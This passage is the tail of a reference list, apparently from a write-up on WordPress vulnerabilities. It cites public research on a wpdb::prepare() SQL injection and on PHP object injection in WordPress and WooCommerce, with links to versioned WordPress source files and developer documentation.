  <https://web.archive.org/web/20191219110854/https://medium.com/websec/wordpress-sqli-bbb2afcc8e94>
  and the PoC follow-up
  <https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e>
  ; original report <https://hackerone.com/reports/179920>
* Karim El Ouerghemmi & Slavco Mihajloski, *"Privilege Escalation in 2.3M
  WooCommerce Shops"*, RIPS, 2018-02-26 (CVE-2017-18356) — stage 1 —
  <https://web.archive.org/web/20200127173002/https://blog.ripstech.com/2018/woocommerce-php-object-injection/>
* Tom Van Goethem, *"WordPress < 3.6.1 PHP Object Injection"* —
  <https://tom.vg/2013/09/wordpress-php-object-injection/>
* WordPress source, exact versions:
  `wpdb::prepare()` before the fix —
  <https://github.com/WordPress/WordPress/blob/4.8.1/wp-includes/wp-db.php#L1291> ;
  the 4.8.2 attempt —
  <https://github.com/WordPress/WordPress/blob/4.8.2/wp-includes/wp-db.php#L1291> ;
  the 4.8.3 rewrite plus `placeholder_escape()`, `add_placeholder_escape()`,
  `remove_placeholder_escape()` —
  <https://github.com/WordPress/WordPress/blob/4.8.3/wp-includes/wp-db.php#L1292> ;
  `delete_metadata()` —
  <https://github.com/WordPress/WordPress/blob/4.8.1/wp-includes/meta.php#L366> ;
  current trunk —
  <https://github.com/WordPress/wordpress-develop/blob/trunk/src/wp-includes/class-wpdb.php>
  ; `maybe_serialize()`, `maybe_unserialize()`, `is_serialized()` —
  <https://github.com/WordPress/wordpress-develop/blob/trunk/src/wp-includes/functions.php>
* Developer reference:
  <https://developer.wordpress.org/reference/classes/wpdb/prepare/>,
  <https://developer.wordpress.org/reference/classes/wpdb/placeholder_escape/>,
  <https://developer.wordpress.org/reference/functions/is_serialized/>
